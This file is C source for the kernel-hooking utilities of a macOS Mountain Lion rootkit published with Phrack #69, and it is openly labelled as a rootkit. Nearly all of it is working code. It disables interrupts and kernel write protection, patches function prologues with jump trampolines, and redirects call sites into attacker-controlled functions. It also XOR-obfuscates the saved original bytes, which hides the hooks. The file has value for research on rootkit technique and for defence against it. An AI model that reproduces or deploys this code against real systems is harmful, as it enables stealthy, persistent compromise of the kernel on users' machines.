/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * hijacking_utils.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "hijacking_utils.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "disasm_utils.h"
#include "utlist.h"

extern struct kernel_info g_kernel_info;

static kern_return_t install_xrefs_trampoline(struct xrefs *xref, struct nops *nop, mach_vm_address_t our_function);
static int total_free_nops(struct nops *nops_head);
static int total_xrefs(struct xrefs *xrefs);

#pragma Functions to install and remove trampoline

/*
 * function to patch prologue with a jmp to one function under our control
 * caller is responsible for providing space to store original bytes
 */
kern_return_t
install_trampoline(char *symbol, mach_vm_address_t dest_address, void *orig_bytes)
{
    char trampoline[12] = "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00" // mov rax, address
                          "\xFF\xE0"; // jmp rax
    
    mach_vm_address_t patch_addr = solve_kernel_symbol(&g_kernel_info, symbol);
    if (patch_addr == 0) 
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Can't solve symbol [%s]\n", __FUNCTION__);
#endif
        return KERN_FAILURE;
    }
    // store the original bytes in user provided buffer
    memcpy(orig_bytes, (void*)patch_addr, sizeof(trampoline));
    // XOR the original bytes
    for (int i = 0; i < TRAMPOLINE_SIZE; i++)
        ((char*)orig_bytes)[i] ^= XOR_KEY;
    // set the target address
    memcpy(trampoline+2, &dest_address, sizeof(mach_vm_address_t));
    // patch the target address with the trampoline
    disable_interrupts();
    disable_wp();
    memcpy((void*)patch_addr, trampoline, sizeof(trampoline));
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

/*
 * remove trampoline by restoring original bytes
 * caller is responsible for supplying those bytes
 */
kern_return_t
remove_trampoline(char *symbol, void *orig_bytes)
{
    mach_vm_address_t patch_addr = solve_kernel_symbol(&g_kernel_info, symbol);
    if (patch_addr == 0) return KERN_FAILURE;
    
    // UNXOR the original bytes
    for (int i = 0; i < TRAMPOLINE_SIZE; i++)
        ((char*)orig_bytes)[i] ^= XOR_KEY;
    
    disable_interrupts();
    disable_wp();
    memcpy((void*)patch_addr, orig_bytes, TRAMPOLINE_SIZE);
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

/*
 * install the trampoline that will redirect the call into our function
 * we patch the original call ref to one free nop area and copy the trampoline into this area
 */
static kern_return_t
install_xrefs_trampoline(struct xrefs *xref, struct nops *nop, mach_vm_address_t our_function)
{
    char trampoline[12] = "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00" // mov rax, address
                          "\xFF\xE0"; // jmp rax
    // set the trampoline with the address of our function
    memcpy(trampoline+2, &our_function, sizeof(mach_vm_address_t));
    // compute the offset from the call to the nop location where trampoline will be installed
    int32_t offset = (int32_t)(nop->address - xref->address - xref->size);
    // the offset portion of the call we will modify
    mach_vm_address_t patch_offset_adr = xref->address + 1;
#if DEBUG
//    //moony_modify//printf("[DEBUG] Installing xrefs trampoline at 0x%llx with offset %d and trampoline at 0x%llx\n", patch_offset_adr, offset, nop->address);
#endif
    // install the trampoline in the nop space
    memcpy((void*)(nop->address), (void*)trampoline, sizeof(trampoline));
    // redirect the original call to the trampoline
    memcpy((void*)patch_offset_adr, &offset, sizeof(int32_t));
    nop->used = 1;
    return KERN_SUCCESS;
}

#pragma Functions to hijack xrefs calls

/*
 * modify the calls to xrefs to a trampoline we control and then into our own function
 * call symbol changed to call trampoline located in NOP space
 * trampoline: jmp our function -> do whatever we need -> call back original function
 * NOTE: caller is responsible to find if there's enough space to call this function
 *       since he's also responsible to pass the two structures to this function
 */
kern_return_t
hijack_xrefs(char *symbol, mach_vm_address_t hijacked_function, struct xrefs *xrefs_head, struct nops *nops_head, char type)
{
    if (xrefs_head == NULL) return KERN_FAILURE;
    if (nops_head  == NULL) return KERN_FAILURE;

    struct xrefs *xrefs_cur;
    struct nops *nops_cur = nops_head;
    disable_interrupts();
    disable_wp();
    // a single trampoline used for all xrefs
    if (type == 0)
    {
        LL_FOREACH(xrefs_head, xrefs_cur)
        {
            // 5 bytes CALL
            if (xrefs_cur->size != 5) return KERN_FAILURE;    
            install_xrefs_trampoline(xrefs_cur, nops_cur, hijacked_function);
        }   
    }
    // each xrefs has its own trampoline (!)
    else
    {
        LL_FOREACH(xrefs_head, xrefs_cur)
        {
            // 5 bytes CALL
            if (xrefs_cur->size != 5) return KERN_FAILURE;    
            //        while (nops_cur != NULL && nops_cur->used == 1) nops_cur = nops_cur->next;
            //        if (nops_cur == NULL) break;
            install_xrefs_trampoline(xrefs_cur, nops_cur, hijacked_function);
            nops_cur = nops_cur->next;
            if (nops_cur == NULL) break;
        }
    }
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

/*
 * to restore the xrefs we just need the symbol
 * iterate the list of xrefs that were patched and calculate again the offset to symbol call
 */
kern_return_t
unhijack_xrefs(char *symbol, struct xrefs *xrefs_head, struct nops *nops_head)
{
    mach_vm_address_t symbol_address = solve_kernel_symbol(&g_kernel_info, symbol);
    if (symbol == 0)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Can't solve symbol [%s]\n", __FUNCTION__);
#endif
        return KERN_FAILURE;
    }
    struct xrefs *cur = NULL;
    // we patch everything in a row so only need to disable once the write protection
    disable_interrupts();
    disable_wp();
    // restore the calls to the original symbol
    LL_FOREACH(xrefs_head, cur)
    {
        // compute the offset to the trampoline
        int32_t offset = (int32_t)(symbol_address - cur->address - cur->size);
        // the offset address we will modify
        mach_vm_address_t patch_offset_adr = cur->address + 1;
        // change the call offset
        memcpy((void*)patch_offset_adr, &offset, sizeof(int32_t));
    }
    // restore the original NOPs
    struct nops *nops_cur = NULL;
    LL_FOREACH(nops_head, nops_cur)
    {
        memcpy((void*)nops_cur->address, nops_cur->orig_bytes, nops_cur->size);
    }
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

#pragma mark Auxiliary functions

static int
total_free_nops(struct nops *nops_head)
{
    int nops_count = 0;
    struct nops *nops_cur;
    LL_FOREACH(nops_head, nops_cur)
    {
        if (nops_cur->used == 0) nops_count++;
    }
    return nops_count;
}

static int
total_xrefs(struct xrefs *xrefs)
{
    int xrefs_count = 0;
    struct xrefs *cur;
    LL_FOREACH(xrefs, cur)
    {
        xrefs_count++;
    }
    return xrefs_count;
}




kern_return_t
install_trampoline_any(mach_vm_address_t patch_addr, mach_vm_address_t dest_address, void *orig_bytes)
{
    char trampoline[12] = "\x48\xB8\x00\x00\x00\x00\x00\x00\x00\x00" // mov rax, address
    "\xFF\xE0"; // jmp rax
    
    //mach_vm_address_t patch_addr = solve_kernel_symbol(&g_kernel_info, symbol);
    if (patch_addr == 0)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] patch_addr[0x%x] is not valid [%s]\n", patch_addr, __FUNCTION__);
#endif
        return KERN_FAILURE;
    }
    // store the original bytes in user provided buffer
    memcpy(orig_bytes, (void*)patch_addr, sizeof(trampoline));
    // XOR the original bytes
    //for (int i = 0; i < TRAMPOLINE_SIZE; i++)
    //    ((char*)orig_bytes)[i] ^= XOR_KEY;
    // set the target address
    memcpy(trampoline+2, &dest_address, sizeof(mach_vm_address_t));
    // patch the target address with the trampoline
    disable_interrupts();
    disable_wp();
    memcpy((void*)patch_addr, trampoline, sizeof(trampoline));
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}


kern_return_t
remove_trampoline_any(mach_vm_address_t patch_addr, void *orig_bytes)
{
    //mach_vm_address_t patch_addr = solve_kernel_symbol(&g_kernel_info, symbol);
    if (patch_addr == 0) return KERN_FAILURE;
    
    // UNXOR the original bytes
    //for (int i = 0; i < TRAMPOLINE_SIZE; i++)
    //    ((char*)orig_bytes)[i] ^= XOR_KEY;
    
    disable_interrupts();
    disable_wp();
    memcpy((void*)patch_addr, orig_bytes, TRAMPOLINE_SIZE);
    enable_wp();
    enable_interrupts();
    return KERN_SUCCESS;
}

